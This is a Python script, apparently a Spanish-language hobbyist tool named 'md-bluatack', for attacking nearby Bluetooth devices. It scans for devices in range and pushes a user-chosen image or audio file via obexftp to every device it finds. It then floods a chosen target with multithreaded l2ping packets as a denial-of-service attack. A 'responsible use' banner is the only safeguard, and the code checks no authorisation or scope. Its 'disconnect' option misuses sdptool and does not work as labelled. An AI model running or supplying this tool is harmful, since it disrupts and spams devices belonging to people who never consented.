import os
import subprocess
import threading
import time
import logging
from datetime import datetime

# Configuración de logging para generar un archivo de registro
logging.basicConfig(filename='audit_log.txt', level=logging.INFO, format='%(asctime)s - %(message)s')

# Validación e instalación de herramientas necesarias
def check_installation():
    tools = ['hcitool', 'l2ping', 'sdptool']
    for tool in tools:
        if subprocess.call(['which', tool], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) != 0:
            print(f"Instalando {tool}...")
            os.system(f"sudo apt-get install {tool} -y")
            print(f"{tool} instalado correctamente.")
        else:
            print(f"{tool} ya está instalado.")
    print("Todas las herramientas necesarias están instaladas.\n")

# Banner del programa
def print_banner():
    print("**********************************************************")
    print("*                   Creado por midesmis                  *")
    print("*                  md-bluatack v8.0                      *")
    print("*     Úsese con responsabilidad en entornos controlados  *")
    print("**********************************************************")

# Escaneo de dispositivos Bluetooth cercanos
def scan_devices():
    print("Escaneando dispositivos Bluetooth cercanos...")
    try:
        output = subprocess.check_output("sudo hcitool scan", shell=True, text=True)
        lines = output.strip().splitlines()[1:]
        devices = {i: line.split()[0] for i, line in enumerate(lines)}
        for idx, line in enumerate(lines):
            print(f"|{idx}| {line}")
        return devices
    except subprocess.CalledProcessError:
        print("[!] Error durante el escaneo.")
        return {}

# Obtener información detallada del dispositivo seleccionado
def device_info(mac_address):
    print(f"Obteniendo información del dispositivo {mac_address}...")
    try:
        output = subprocess.check_output(f"sudo sdptool browse {mac_address}", shell=True, text=True)
        print(output)
        return output
    except subprocess.CalledProcessError:
        print("[!] No se pudo obtener la información del dispositivo.")
        return None

# Enviar un archivo (audio o imagen) a los dispositivos cercanos
def send_file(devices, file_path):
    print(f"Enviando archivo {file_path} a todos los dispositivos...")
    for mac in devices.values():
        try:
            os.system(f"sudo obexftp --nopath --noconn --uuid none --bluetooth {mac} --channel 9 --put {file_path}")
            print(f"[+] Archivo enviado a {mac}")
        except subprocess.CalledProcessError:
            print(f"[-] No se pudo enviar el archivo a {mac}")

# Ataque DoS (Denegación de servicio) al dispositivo seleccionado
def attack_dos(mac_address, package_size=600, threads_count=5):
    def dos(mac_address, package_size):
        os.system(f"sudo l2ping -i hci0 -s {package_size} -f {mac_address}")

    print(f"Iniciando ataque DoS al dispositivo {mac_address}...")
    threads = []
    for _ in range(threads_count):
        t = threading.Thread(target=dos, args=(mac_address, package_size))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

# Desconectar dispositivos conectados
def disconnect_devices(mac_address):
    print(f"Desconectando dispositivos del {mac_address}...")
    try:
        os.system(f"sudo sdptool del {mac_address}")
        print(f"[+] Dispositivos desconectados de {mac_address}")
    except subprocess.CalledProcessError:
        print(f"[-] No se pudo desconectar los dispositivos del {mac_address}")

# Validar que el servicio de Bluetooth esté activado y activarlo si no lo está
def check_bluetooth_service():
    output = subprocess.getoutput("sudo service bluetooth status")
    if "inactive" in output:
        print("El servicio Bluetooth está desactivado. Activándolo...")
        os.system("sudo service bluetooth start")
    else:
        print("El servicio Bluetooth ya está activado.")

# Función principal que ejecuta todas las opciones
def main():
    # Validar e instalar herramientas necesarias
    check_installation()

    # Validar el estado del servicio Bluetooth
    check_bluetooth_service()

    # Mostrar banner
    print_banner()

    # Escanear dispositivos Bluetooth
    devices = scan_devices()
    if not devices:
        print("No se encontraron dispositivos Bluetooth.")
        return

    # Seleccionar dispositivo para auditar
    try:
        target_id = int(input("Introduce el ID del dispositivo para auditar > "))
        target_mac = devices[target_id]
    except (ValueError, KeyError):
        print("[!] Selección inválida.")
        return

    # Obtener información del dispositivo
    device_info(target_mac)

    # Enviar archivo a dispositivos cercanos
    file_path = input("Introduce la ruta del archivo a enviar (imagen o audio) > ")
    send_file(devices, file_path)

    # Elegir el ataque a realizar
    print("\nOpciones de ataque:")
    print("1. Ataque DoS")
    print("2. Desconectar dispositivos conectados")
    choice = input("Elige una opción (1/2) > ")

    if choice == '1':
        package_size = int(input("Introduce el tamaño del paquete para el ataque DoS > "))
        threads_count = int(input("Introduce la cantidad de hilos > "))
        attack_dos(target_mac, package_size, threads_count)
    elif choice == '2':
        disconnect_devices(target_mac)
    else:
        print("[!] Opción no válida.")

    # Mensaje de salida
    print("\nSaliendo del programa...")
    logging.info(f"Auditoría finalizada en {datetime.now()}")


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Programa interrumpido por el usuario.")
    except Exception as e:
        print(f"[!] Error inesperado: {str(e)}")
